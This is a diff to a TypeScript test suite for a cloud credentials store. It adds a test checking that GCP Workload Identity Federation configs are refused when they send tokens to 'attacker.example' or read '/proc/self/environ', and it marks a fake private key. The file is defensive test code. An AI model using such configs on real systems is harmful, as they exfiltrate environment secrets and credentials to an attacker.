@@ -52,6 +52,7 @@ describe('CloudProviderCredentialsStore', () => {
   });
 
   it('allows multiple named credentials and removes by id', async () => {
+    process.env.FOX_GCP_WIF_TOKEN_FILES = '/var/run/secrets/token';
     await store.create(alice, 'GCP Dev', 'gcp', {
       serviceAccountJson: JSON.stringify({
         type: 'external_account',
@@ -74,7 +75,28 @@ describe('CloudProviderCredentialsStore', () => {
     expect(await store.getDecryptedById(alice, gcp!.id)).toBeNull();
   });
 
+  it('refuses a Workload Identity Federation config that reads a file this install has not listed', async () => {
+    delete process.env.FOX_GCP_WIF_TOKEN_FILES;
+    const config = (over: Record<string, unknown>) =>
+      JSON.stringify({
+        type: 'external_account',
+        audience: '//iam.googleapis.com/projects/1/locations/global/workloadIdentityPools/p/providers/x',
+        subject_token_type: 'urn:ietf:params:oauth:token-type:jwt',
+        token_url: 'https://sts.googleapis.com/v1/token',
+        credential_source: { file: '/proc/self/environ' },
+        ...over,
+      });
+    await expect(
+      store.create(alice, 'GCP Exfil', 'gcp', { serviceAccountJson: config({ token_url: 'https://attacker.example/sts' }) })
+    ).rejects.toThrow(/token_url must be/);
+    await expect(store.create(alice, 'GCP Exfil', 'gcp', { serviceAccountJson: config({}) })).rejects.toThrow(
+      /does not allow reading a subject token/
+    );
+    expect((await store.list(alice)).some((c) => c.name === 'GCP Exfil')).toBe(false);
+  });
+
   it('stores a Workload Identity Federation config and refuses a downloaded service-account key', async () => {
+    process.env.FOX_GCP_WIF_TOKEN_FILES = '/var/run/secrets/token';
     const saved = await store.create(alice, 'GCP WIF', 'gcp', {
       serviceAccountJson: JSON.stringify({
         type: 'external_account',
@@ -96,7 +118,7 @@ describe('CloudProviderCredentialsStore', () => {
           type: 'service_account',
           project_id: 'p',
           client_email: 'sa@p.iam.gserviceaccount.com',
-          private_key: '-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n',
+          private_key: '-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n', // gitleaks:allow (fake key: the body is 'abc')
         }),
       })
     ).rejects.toThrow(/security risk/);
